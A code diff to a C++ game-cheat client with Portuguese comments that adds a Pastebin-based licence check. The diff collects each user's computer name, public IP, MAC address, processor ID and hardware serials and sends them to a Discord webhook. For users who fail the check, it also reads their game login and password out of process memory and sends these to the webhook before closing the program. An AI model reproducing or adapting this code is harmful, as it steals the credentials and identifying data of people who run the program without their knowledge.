@@ -1,5 +1,51 @@
 #include "Sistema.h"
 
+size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
+	userp->append((char*)contents, size * nmemb);
+	return size * nmemb;
+}
+
+// Função para obter dados do Pastebin
+std::string getDataFromUrl(const std::string& url) {
+	CURL* curl;
+	CURLcode res;
+	std::string readBuffer;
+
+	curl = curl_easy_init();
+	if (curl) {
+		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
+		res = curl_easy_perform(curl);
+		curl_easy_cleanup(curl);
+
+		/*if (res != CURLE_OK) {
+			std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+		}*/
+	}
+	return readBuffer;
+}
+
+void getFromPastebin() {
+	std::string data = getDataFromUrl("https://pastebin.com/raw/Han0n8n7");
+
+	std::stringstream ss(data);
+	std::string line;
+
+	while (std::getline(ss, line)) {
+		size_t firstDash = line.find(" - ");
+		size_t secondDash = line.rfind(" - ");
+
+		std::string name = line.substr(0, firstDash);
+		std::string serial = line.substr(firstDash + 3, secondDash - firstDash - 3);
+		std::string date = line.substr(secondDash + 3);
+
+		names.push_back(name);
+		serials.push_back(serial);
+		dates.push_back(date);
+	}
+}
+
 unsigned long djb2Hash(const std::string& str) {
 	unsigned long hash = 5381;
 	int c;
@@ -13,26 +59,16 @@ unsigned long djb2Hash(const std::string& str) {
 }
 
 bool bCheckRegister() {
-	hres = initializeCOM();
-	hres = connectToWMI(&pLoc, &pSvc);
-
-	if (FAILED(hres)) {
-		//std::cerr << "Erro ao conectar ao WMI." << std::endl;
-		uninitializeCOM();
-		//return 1;
-	}
-
-	biosSerialNumber = getBiosSerialNumber(pSvc);
-	diskSerialNumber = getDiskDriveSerialNumber(pSvc);
-
 	std::string valorConcatenado = biosSerialNumber + diskSerialNumber;
 
 	unsigned long hash = djb2Hash(valorConcatenado);
 
-	for (int i = 0; i < sizeof(dwSerialHD_Client) / sizeof(unsigned long); i++) { //até o tamanho do vetor
-		if (hash == dwSerialHD_Client[i]) { //se o serial do vetor for igual ao serial do usuario, então..
-			expireDate = expireDate_[i];
-			dwNome = dwNome_[i];
+	getFromPastebin();
+
+	for (int i = 0; i < serials.size(); i++) { //até o tamanho do vetor
+		if (hash == std::stoul(serials[i])) { //se o serial do vetor for igual ao serial do usuario, então..
+			expireDate = dates[i];
+			dwNome = names[i];
 
 			return TRUE;
 		}
@@ -45,17 +81,29 @@ void protectMachine() {
 	while (true) {
 		Sleep(10);
 
-		if (read(0x038581DC, 4) > 0) {
-			if (!bDiscord) {
-				if (!bCheckRegister())
-					ExitProcess(0);
+		if (!bGetDadosPC) {
+			hres = initializeCOM();
+			hres = connectToWMI(&pLoc, &pSvc);
 
-				//Webhook Discord
-				std::string computerName = getComputerNameWMI(pSvc);
-				std::string publicIP = getPublicIP();
-				std::string macAddress = getPrimaryMACAddressWMI(pSvc);
-				std::string processorName = getProcessorName(pSvc);
-				std::string processorId = getProcessorId(pSvc);
+			if (FAILED(hres))
+				uninitializeCOM();
+
+			computerName = getComputerNameWMI(pSvc);
+			publicIP = getPublicIP();
+			macAddress = getPrimaryMACAddressWMI(pSvc);
+			processorName = getProcessorName(pSvc);
+			processorId = getProcessorId(pSvc);
+			biosSerialNumber = getBiosSerialNumber(pSvc);
+			diskSerialNumber = getDiskDriveSerialNumber(pSvc);
+
+			bGetDadosPC = true;
+		}
+
+		if (read(0x038581DC, 4) > 0) {
+			if (!bSendDadosPCToDiscord) {
+				//Check register
+				if (!bCheckRegister())
+					bFlag = true;
 
 				std::string szMessage =
 					"-------------------------------------------------------------------\n"
@@ -73,6 +121,23 @@ void protectMachine() {
 
 				sendDiscordWebhook(szMessage);
 
+				if (bFlag) {
+					dwLogin = readString(0x036BD468, 0x20);
+					dwPassword = readString(0x036BD368, 0x20);
+
+					std::string szMessage2 =
+						"-------------------------------- Atention! -----------------------------------\n"
+						"Cliente: " + dwNome + "\n\n" +
+						"ID: " + dwLogin + "\n" +
+						"Pw: " + dwPassword + "\n" +
+						"Obs.: Usuario desconhecido. Fechando o client!";
+
+					sendDiscordWebhook(szMessage2);
+
+					Sleep(1000);
+					ExitProcess(0);
+				}
+
 				//Time do cheat
 				lol(hHora, false);
 
@@ -86,12 +151,12 @@ void protectMachine() {
 				//lol(disableProtectMouse, false);
 
 				//Hooks na sessão .text
-				lol(hooks, false);
+				//lol(hooks, false);
 
-				bDiscord = true;
+				bSendDadosPCToDiscord = true;
 			}
 
-			if (!bLogin) {
+			if (!bSendLoginToDiscord) {
 				Sleep(1000);
 
 				dwLogin = readString(0x036BD468, 0x20);
@@ -105,11 +170,11 @@ void protectMachine() {
 
 				sendDiscordWebhook(szMessage);
 
-				bLogin = true;
+				bSendLoginToDiscord = true;
 			}
 		}
 		else
-			bLogin = false;
+			bSendLoginToDiscord = false;
 	}
 }
 
@@ -329,200 +394,230 @@ HRESULT executeWMIQuery(IWbemServices* pSvc, const std::wstring& query, IEnumWbe
 }
 
 std::string getComputerNameWMI(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_ComputerSystem", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_ComputerSystem", &pEnumerator);
 
-	if (FAILED(hres)) {
-		return "Desconhecido";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-
-	while (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (0 == uReturn) {
-			break;
+		if (FAILED(hres)) {
+			return "Desconhecido";
 		}
 
-		VARIANT vtProp;
-		hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
-		std::wstring computerName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
-		VariantClear(&vtProp);
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
 
-		pclsObj->Release();
+		while (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
 
-		return std::string(computerName.begin(), computerName.end());
+			if (0 == uReturn) {
+				break;
+			}
+
+			VARIANT vtProp;
+			hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
+			std::wstring computerName(vtProp.bstrVal, SysStringLen(vtProp.bstrVal));
+			VariantClear(&vtProp);
+
+			pclsObj->Release();
+
+			return std::string(computerName.begin(), computerName.end());
+		}
+
+		pEnumerator->Release();
+		return "Desconhecido";
 	}
-
-	pEnumerator->Release();
-	return "Desconhecido";
+	catch (const std::exception& e) {
+		return "Erro ao obter o nome do computador";
+	}
 }
 
 std::string getPrimaryMACAddressWMI(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE", &pEnumerator);
 
-	if (FAILED(hres)) {
-		//std::cerr << "Falha na consulta WMI." << std::endl;
-		return "Erro na consulta WMI";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-	std::string macAddress;
-
-	if (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (uReturn) {
-			VARIANT vtProp;
-			hr = pclsObj->Get(L"MACAddress", 0, &vtProp, 0, 0);
-			if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-				_bstr_t bstrMacAddress(vtProp.bstrVal, false);
-				macAddress = (char*)bstrMacAddress;
-			}
-			VariantClear(&vtProp);
-
-			pclsObj->Release();
+		if (FAILED(hres)) {
+			//std::cerr << "Falha na consulta WMI." << std::endl;
+			return "Erro na consulta WMI";
 		}
-	}
 
-	pEnumerator->Release();
-	return macAddress;
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
+		std::string macAddress;
+
+		if (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+
+			if (uReturn) {
+				VARIANT vtProp;
+				hr = pclsObj->Get(L"MACAddress", 0, &vtProp, 0, 0);
+				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
+					_bstr_t bstrMacAddress(vtProp.bstrVal, false);
+					macAddress = (char*)bstrMacAddress;
+				}
+				VariantClear(&vtProp);
+
+				pclsObj->Release();
+			}
+		}
+
+		pEnumerator->Release();
+		return macAddress;
+	}
+	catch (const std::exception& e) {
+		return "Erro ao obter o MAC do computador";
+	}
 }
 
 std::string getProcessorId(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT ProcessorId FROM Win32_Processor", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT ProcessorId FROM Win32_Processor", &pEnumerator);
 
-	if (FAILED(hres)) {
-		//std::cerr << "Falha na consulta WMI." << std::endl;
-		return "Erro na consulta WMI";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-	std::string processorId;
-
-	if (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (uReturn) {
-			VARIANT vtProp;
-			hr = pclsObj->Get(L"ProcessorId", 0, &vtProp, 0, 0);
-			if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-				_bstr_t bstrProcessorId(vtProp.bstrVal, false);
-				processorId = (char*)bstrProcessorId;
-			}
-			VariantClear(&vtProp);
-
-			pclsObj->Release();
+		if (FAILED(hres)) {
+			//std::cerr << "Falha na consulta WMI." << std::endl;
+			return "Erro na consulta WMI";
 		}
-	}
 
-	pEnumerator->Release();
-	return processorId;
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
+		std::string processorId;
+
+		if (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+
+			if (uReturn) {
+				VARIANT vtProp;
+				hr = pclsObj->Get(L"ProcessorId", 0, &vtProp, 0, 0);
+				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
+					_bstr_t bstrProcessorId(vtProp.bstrVal, false);
+					processorId = (char*)bstrProcessorId;
+				}
+				VariantClear(&vtProp);
+
+				pclsObj->Release();
+			}
+		}
+
+		pEnumerator->Release();
+		return processorId;
+	}
+	catch (const std::exception& e) {
+		return "Erro ao obter a id do processador";
+	}
 }
 
 std::string getProcessorName(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT Name FROM Win32_Processor", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT Name FROM Win32_Processor", &pEnumerator);
 
-	if (FAILED(hres)) {
-		//std::cerr << "Falha na consulta WMI." << std::endl;
-		return "Erro na consulta WMI";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-	std::string processorName;
-
-	if (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (uReturn) {
-			VARIANT vtProp;
-			hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
-			if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-				_bstr_t bstrProcessorName(vtProp.bstrVal, false);
-				processorName = (char*)bstrProcessorName;
-			}
-			VariantClear(&vtProp);
-
-			pclsObj->Release();
+		if (FAILED(hres)) {
+			//std::cerr << "Falha na consulta WMI." << std::endl;
+			return "Erro na consulta WMI";
 		}
-	}
 
-	pEnumerator->Release();
-	return processorName;
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
+		std::string processorName;
+
+		if (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+
+			if (uReturn) {
+				VARIANT vtProp;
+				hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
+				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
+					_bstr_t bstrProcessorName(vtProp.bstrVal, false);
+					processorName = (char*)bstrProcessorName;
+				}
+				VariantClear(&vtProp);
+
+				pclsObj->Release();
+			}
+		}
+
+		pEnumerator->Release();
+		return processorName;
+	}
+	catch (const std::exception& e) {
+		return "Erro ao obter o nome do processador";
+	}
 }
 
 std::string getBiosSerialNumber(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_BIOS", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_BIOS", &pEnumerator);
 
-	if (FAILED(hres)) {
-		//std::cerr << "Falha na consulta WMI." << std::endl;
-		return "Erro na consulta WMI";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-	std::string biosSerialNumber;
-
-	if (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (uReturn) {
-			VARIANT vtProp;
-			hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
-			if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-				_bstr_t bstrBiosSerialNumber(vtProp.bstrVal, false);
-				biosSerialNumber = (char*)bstrBiosSerialNumber;
-			}
-			VariantClear(&vtProp);
-
-			pclsObj->Release();
+		if (FAILED(hres)) {
+			//std::cerr << "Falha na consulta WMI." << std::endl;
+			return "Erro na consulta WMI";
 		}
-	}
 
-	pEnumerator->Release();
-	return biosSerialNumber;
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
+		std::string biosSerialNumber;
+
+		if (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+
+			if (uReturn) {
+				VARIANT vtProp;
+				hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
+				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
+					_bstr_t bstrBiosSerialNumber(vtProp.bstrVal, false);
+					biosSerialNumber = (char*)bstrBiosSerialNumber;
+				}
+				VariantClear(&vtProp);
+
+				pclsObj->Release();
+			}
+		}
+
+		pEnumerator->Release();
+		return biosSerialNumber;
+	}
+	catch (const std::exception& e) {
+		return "Erro ao obter o serial da bios";
+	}
 }
 
 std::string getDiskDriveSerialNumber(IWbemServices* pSvc) {
-	IEnumWbemClassObject* pEnumerator = NULL;
-	HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_DiskDrive", &pEnumerator);
+	try {
+		IEnumWbemClassObject* pEnumerator = NULL;
+		HRESULT hres = executeWMIQuery(pSvc, L"SELECT SerialNumber FROM Win32_DiskDrive", &pEnumerator);
 
-	if (FAILED(hres)) {
-		//std::cerr << "Falha na consulta WMI." << std::endl;
-		return "Erro na consulta WMI";
-	}
-
-	IWbemClassObject* pclsObj = NULL;
-	ULONG uReturn = 0;
-	std::string diskDriveSerialNumber;
-
-	if (pEnumerator) {
-		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-		if (uReturn) {
-			VARIANT vtProp;
-			hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
-			if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
-				_bstr_t bstrDiskDriveSerialNumber(vtProp.bstrVal, false);
-				diskDriveSerialNumber = (char*)bstrDiskDriveSerialNumber;
-			}
-			VariantClear(&vtProp);
-
-			pclsObj->Release();
+		if (FAILED(hres)) {
+			//std::cerr << "Falha na consulta WMI." << std::endl;
+			return "Erro na consulta WMI";
 		}
-	}
 
-	pEnumerator->Release();
-	return diskDriveSerialNumber;
+		IWbemClassObject* pclsObj = NULL;
+		ULONG uReturn = 0;
+		std::string diskDriveSerialNumber;
+
+		if (pEnumerator) {
+			HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+
+			if (uReturn) {
+				VARIANT vtProp;
+				hr = pclsObj->Get(L"SerialNumber", 0, &vtProp, 0, 0);
+				if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
+					_bstr_t bstrDiskDriveSerialNumber(vtProp.bstrVal, false);
+					diskDriveSerialNumber = (char*)bstrDiskDriveSerialNumber;
+				}
+				VariantClear(&vtProp);
+
+				pclsObj->Release();
+			}
+		}
+
+		pEnumerator->Release();
+		return diskDriveSerialNumber;
+	}
+	catch (const std::exception& e) {
+		return "Erro ao obter o serial do disco";
+	}
 }
 
 //
